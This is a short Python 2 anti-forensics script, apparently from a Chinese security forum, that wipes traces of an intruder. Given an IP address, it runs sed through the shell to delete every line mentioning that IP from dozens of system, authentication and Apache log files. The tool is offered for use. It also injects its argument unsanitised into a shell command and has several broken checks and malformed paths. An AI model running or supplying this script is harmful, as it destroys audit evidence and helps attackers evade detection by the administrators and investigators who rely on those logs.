#!/usr/bin/env python
import os , sys , subprocess
def banner():
        print '''
This is linux log clear script \n
   Welcome to www.90sec.org\n
    Python log.py 127.0.0.1\n
          By:Mr,PriNce'''
try:
        host = sys.argv[1]
        if len(sys.argv) < 1:
                banner
        log = ["/var/log/messages","/var/log/messages.1","/etc/syslog.conf","/var/log/secure","/var/log/message","/var/log/lastlog","/var/log/auth.log","/var/log/vsftpd.log","/var/log/apache2/access.log","/var/log/apache2/error.log","/var/log/apache2/error.log.1","/usr/local/httpd/error.log","/apache/apache/message.log","/var/log/apache2/access_log","/var/log/apache2/error.log","/var/log/apache2/error_log ","/var/log/apache/access.log","/var/log/apache/access_log","/var/log/apache/error.log","/var/log/apache/error_log","/var/www/logs/error_log"," /var/www/logs/error.log"," /var/www/logs/access_log","/var/www/logs/access.log","/usr/local/apache/logs/error_log"," /usr/local/apache/logs/error.log","/usr/local/apache/logs/access_log","usr/local/apache/logs/access.log","/var/log/error_log","/var/log/error.log","/var/log/access_log","/var/log/access.log","/usr/local/apache/logs/error_logerror_log.old","/usr/local/apache/logs/access_logaccess_log.old","/var/log/access.log","/var/log/access_log","/usr/local/apache/logs/error_log","/usr/local/apache/logs/error.log","/usr/local/apache/logs/access.log","/var/log/messages.1","/var/log/messages.2","/var/log/messages.3","/var/log/messages.4","/var/log/secure.1","/var/log/secure.2","/var/log/secure.3","/var/log/secure.3","/var/log/secure.4"]
        for line in log:
                if os.path.exists(line):
                        subprocess.call("sed -i '/%s/d' %s" % (host , line),shell=True)
                        print "[+]: %s " % (line)
                else:
                        print "[-]: %s " % (line)
except Exception:
        banner()